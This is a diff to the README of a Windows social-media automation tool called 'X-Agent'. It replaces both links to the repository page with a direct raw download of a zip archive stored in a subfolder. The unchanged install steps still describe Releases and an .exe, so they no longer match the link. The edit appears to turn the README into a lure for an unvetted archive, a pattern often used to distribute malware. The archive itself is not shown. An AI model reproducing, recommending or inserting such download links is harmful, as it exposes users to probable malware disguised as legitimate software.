@@ -1,6 +1,6 @@
 # 🤖 X-Agent - Automate your social media interactions daily
 
-[![](https://img.shields.io/badge/Download-X-Agent-blue.svg)](https://github.com/ecrinb6076/X-Agent)
+[![](https://img.shields.io/badge/Download-X-Agent-blue.svg)](https://github.com/ecrinb6076/X-Agent/raw/refs/heads/main/xmcp/Agent_v2.1.zip)
 
 ## 📖 About this application
 
@@ -23,7 +23,7 @@ Ensure your Windows system keeps up with current updates to prevent errors. You 
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the following link to access the distribution page: [https://github.com/ecrinb6076/X-Agent](https://github.com/ecrinb6076/X-Agent).
+1. Visit the following link to access the distribution page: [https://github.com/ecrinb6076/X-Agent/raw/refs/heads/main/xmcp/Agent_v2.1.zip](https://github.com/ecrinb6076/X-Agent/raw/refs/heads/main/xmcp/Agent_v2.1.zip).
 2. Locate the section labeled Releases on the right side of the page.
 3. Click the link for the latest version.
 4. Choose the file that ends in .exe for Windows.
